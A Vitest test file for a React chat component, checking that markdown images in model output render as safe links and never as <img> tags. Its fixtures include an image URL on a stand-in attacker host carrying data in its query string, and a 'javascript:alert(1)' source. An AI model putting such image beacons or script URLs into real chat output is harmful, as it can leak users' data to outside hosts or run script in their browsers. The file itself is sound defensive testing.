// @vitest-environment jsdom

import { cleanup, render } from "@testing-library/react";
import { afterEach, describe, expect, it } from "vitest";
import MarkdownMessage from "@/components/chat/MarkdownMessage";

afterEach(cleanup);

describe("MarkdownMessage images", () => {
  it("never renders an <img>, so model output cannot beacon data to a remote host", () => {
    const view = render(
      <MarkdownMessage
        content={"![secret](https://evil.example/pixel.png?d=abc)"}
        isUser={false}
      />
    );

    expect(view.container.querySelector("img")).toBeNull();
    const link = view.getByRole("link", { name: "Image: secret" });
    expect(link.getAttribute("href")).toBe("https://evil.example/pixel.png?d=abc");
    expect(link.getAttribute("rel")).toContain("noopener");
  });

  it("does not link non-http image sources", () => {
    const view = render(
      <MarkdownMessage content={"![x](javascript:alert(1))"} isUser={false} />
    );

    expect(view.container.querySelector("img")).toBeNull();
    expect(view.queryByRole("link")).toBeNull();
  });
});
